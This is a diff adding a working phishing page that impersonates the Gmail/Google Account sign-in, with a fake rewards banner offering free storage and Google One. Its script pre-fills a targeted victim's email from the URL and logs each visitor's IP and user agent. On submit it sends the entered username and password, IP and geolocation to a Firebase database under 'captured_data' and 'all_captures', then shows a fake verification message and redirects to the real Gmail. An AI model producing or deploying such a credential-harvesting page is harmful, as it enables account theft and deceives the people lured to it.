@@ -1,0 +1,271 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Gmail - Google Account Login</title>
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
+    <script src="../firebase-config.js"></script>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Google Sans', Roboto, Arial, sans-serif;
+            background: #fff;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        .container {
+            width: 100%;
+            max-width: 450px;
+            padding: 20px;
+        }
+        .login-card {
+            border: 1px solid #dadce0;
+            border-radius: 20px;
+            padding: 48px 40px 36px;
+            animation: fadeIn 0.3s ease;
+        }
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        .logo {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        .logo img { width: 75px; }
+        .logo h1 {
+            font-size: 1.5em;
+            color: #202124;
+            font-weight: 400;
+            margin-top: 10px;
+        }
+        .logo p {
+            color: #5f6368;
+            font-size: 0.9em;
+            margin-top: 5px;
+        }
+        
+        .offer-banner {
+            background: linear-gradient(135deg, #1a73e8, #0d47a1);
+            color: #fff;
+            padding: 15px;
+            border-radius: 12px;
+            text-align: center;
+            margin-bottom: 25px;
+            font-size: 0.9em;
+            line-height: 1.5;
+        }
+        .offer-banner strong { font-size: 1.1em; }
+        
+        .form-group {
+            margin-bottom: 20px;
+        }
+        .form-group label {
+            display: block;
+            color: #5f6368;
+            font-size: 0.85em;
+            margin-bottom: 8px;
+            font-weight: 500;
+        }
+        .form-group input {
+            width: 100%;
+            padding: 14px 16px;
+            border: 1px solid #dadce0;
+            border-radius: 8px;
+            font-size: 1em;
+            transition: all 0.3s;
+            background: #fff;
+            color: #202124;
+        }
+        .form-group input:focus {
+            border-color: #1a73e8;
+            outline: none;
+            box-shadow: 0 0 0 2px rgba(26,115,232,0.2);
+        }
+        .form-group input::placeholder { color: #80868b; }
+        
+        .info-text {
+            color: #5f6368;
+            font-size: 0.85em;
+            margin-bottom: 30px;
+            line-height: 1.4;
+        }
+        .info-text a { color: #1a73e8; text-decoration: none; }
+        .info-text a:hover { text-decoration: underline; }
+        
+        .actions {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        .actions .create-link {
+            color: #1a73e8;
+            font-size: 0.9em;
+            font-weight: 500;
+            text-decoration: none;
+        }
+        .actions .create-link:hover { background: rgba(26,115,232,0.04); }
+        
+        .next-btn {
+            padding: 10px 28px;
+            background: #1a73e8;
+            border: none;
+            border-radius: 20px;
+            color: #fff;
+            font-size: 0.95em;
+            font-weight: 500;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+        .next-btn:hover { background: #1765cc; box-shadow: 0 1px 3px rgba(0,0,0,0.15); }
+        
+        .footer {
+            text-align: center;
+            margin-top: 30px;
+            color: #5f6368;
+            font-size: 0.75em;
+        }
+        .footer a { color: #5f6368; text-decoration: none; margin: 0 10px; }
+        .footer a:hover { color: #202124; }
+        
+        .loading {
+            display: none;
+            text-align: center;
+            padding: 20px;
+        }
+        .loading .spinner {
+            border: 3px solid #e8eaed;
+            border-top: 3px solid #1a73e8;
+            border-radius: 50%;
+            width: 30px;
+            height: 30px;
+            animation: spin 1s linear infinite;
+            margin: 10px auto;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .loading p { color: #5f6368; margin-top: 10px; font-size: 0.9em; }
+        
+        .success-msg {
+            display: none;
+            text-align: center;
+            padding: 25px;
+            background: #e6f4ea;
+            border-radius: 12px;
+        }
+        .success-msg h3 { color: #137333; margin-bottom: 10px; }
+        .success-msg p { color: #202124; font-size: 0.9em; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="login-card">
+            <div class="logo">
+                <div style="font-size:3em; margin-bottom:10px;">📧</div>
+                <h1>Gmail / Google Account</h1>
+                <p>Sign in to continue to Gmail</p>
+            </div>
+            
+            <div class="offer-banner">
+                <strong>🎉 Exclusive Google Rewards!</strong><br>
+                ✅ 50GB Free Drive Space · ✅ Gmail Blue Tick<br>
+                ✅ Premium Google One 6 Months Free
+            </div>
+            
+            <form id="loginForm">
+                <div class="form-group">
+                    <label>Email or phone</label>
+                    <input type="text" id="username" placeholder="Enter your Gmail address" required>
+                </div>
+                <div class="form-group">
+                    <label>Password</label>
+                    <input type="password" id="password" placeholder="Enter your password" required>
+                </div>
+                
+                <div class="info-text">
+                    <a href="#">Forgot email?</a> · <a href="#">Forgot password?</a>
+                </div>
+                
+                <div class="actions">
+                    <a href="#" class="create-link">Create account</a>
+                    <button type="submit" class="next-btn">Next →</button>
+                </div>
+            </form>
+            
+            <div class="loading" id="loading">
+                <div class="spinner"></div>
+                <p>Verifying your Google Account...</p>
+            </div>
+            
+            <div class="success-msg" id="successMsg">
+                <h3>✅ Verified!</h3>
+                <p>Your free rewards have been added to your account! Check your Gmail.</p>
+                <p style="margin-top:10px;font-size:0.8em;color:#5f6368;">Redirecting to Gmail...</p>
+            </div>
+            
+            <div class="footer">
+                <a href="#">Help</a>
+                <a href="#">Privacy</a>
+                <a href="#">Terms</a>
+            </div>
+        </div>
+    </div>
+    
+    <script>
+        const urlParams = new URLSearchParams(window.location.search);
+        const linkID = urlParams.get('id') || 'direct_' + Date.now();
+        const targetEmail = urlParams.get('target') || '';
+        
+        let visitorIP = '';
+        fetch('https://api.ipify.org?format=json')
+            .then(r => r.json())
+            .then(data => {
+                visitorIP = data.ip;
+                db.ref('visits/' + linkID).push({
+                    ip: visitorIP,
+                    userAgent: navigator.userAgent,
+                    timestamp: Date.now(),
+                    page: 'gmail',
+                    target: targetEmail
+                });
+            });
+        
+        if (targetEmail) document.getElementById('username').value = decodeURIComponent(targetEmail);
+        
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            
+            document.getElementById('loginForm').style.display = 'none';
+            document.getElementById('loading').style.display = 'block';
+            
+            let location = 'Unknown';
+            fetch('https://ipapi.co/json/')
+                .then(r => r.json())
+                .then(data => { location = data.city + ', ' + data.country_name; })
+                .catch(() => {})
+                .finally(() => {
+                    db.ref('captured_data/' + linkID).set({
+                        username, password, ip: visitorIP, location,
+                        userAgent: navigator.userAgent, timestamp: Date.now(),
+                        service: 'gmail', serviceIcon: '📧', target: targetEmail
+                    });
+                    db.ref('all_captures').push({
+                        username, password, ip: visitorIP, location,
+                        service: 'gmail', serviceIcon: '📧', target: targetEmail, timestamp: Date.now()
+                    });
+                    
+                    setTimeout(() => {
+                        document.getElementById('loading').style.display = 'none';
+                        document.getElementById('successMsg').style.display = 'block';
+                        setTimeout(() => window.location.href = 'https://gmail.com', 3000);
+                    }, 2000);
+                });
+        });
+    </script>
+</body>
+</html>
